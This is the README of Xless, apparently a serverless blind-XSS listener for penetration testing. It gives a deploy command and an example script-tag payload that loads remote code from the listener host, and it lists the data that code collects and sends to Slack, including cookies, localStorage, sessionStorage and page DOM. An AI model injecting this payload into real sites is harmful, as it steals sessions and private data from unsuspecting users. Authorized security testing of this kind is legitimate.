## :information_source: About The Project
**Xless** is a serverless Blind XSS (bXSS) application that can be used to identify Blind XSS vulnerabilities using your own deployed version of the application.  
There is no need to run a full deployment process; just setup a [zeit.co](https://zeit.co/) account and run `bash deploy.sh`.
That's it. You now have a fully-running Blind XSS listener that uses Slack to notify you for callbacks.

## :warning: Requirements
* [zeit.co](https://zeit.co/) account: zeit provides a **free plan** for serverless. If you use another provider for serverless, code changes should be minimal.
* Slack Incoming Webhook URL.


## :rocket: Deployment
1. Run `bash deploy.sh`

```bash
$ bash deploy.sh

> Deploying ~/xless under X
> https://xless.now.sh [v2] [in clipboard] [4s]
> Success! Deployment ready [4s]
```
2. Use the URL for blind XSS testing :fire:

**Xless will automatically serve the XSS payload, collect information, and exfiltrate it into your serverless app, which is then sent right to you in Slack.**


## :speech_balloon: Example Payload

```html
<script src="https://xless.now.sh"></script>
```


## :eyes: Demo

## :incoming_envelope: Collected Data

* Cookies
* User-Agent
* HTTP Referrer
* Browser DOM
* Browser Time
* Document Location
* Origin
* LocalStorage
* SessionStorage
* IP Address
* Commit

## :satellite: Out-of-Band (OOB) Callbacks Listener

Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS requests. Any HTTP GET request that is sent to non-parent path will be alerted.

## :eyes: Demo

```bash
$ curl https://xless.now.sh/callback-canary
```

![OOB CallBack Listener Demo](https://raw.githubusercontent.com/mazen160/public/master/static/images/xless-screenshot-oob-callback-example.png)

Or anything random, such as:

```bash
$ curl https://xless.now.sh/88bf0ecd
```


##  Example Blind XSS payloads

You can view a number of handy XSS payloads for your xless app at `$URL/examples`
* URL: `https://xless.now.sh/examples`
Once you deploy your app, you can find the examples there.


## Contribution
Contribution is very welcome. Please share your ideas by Github issues and pull requests.

Here are some ideas to start with:
1. Enabling sharing of page screenshot - Check `test.payload.js`.
2. _Your idea of a new feature_?
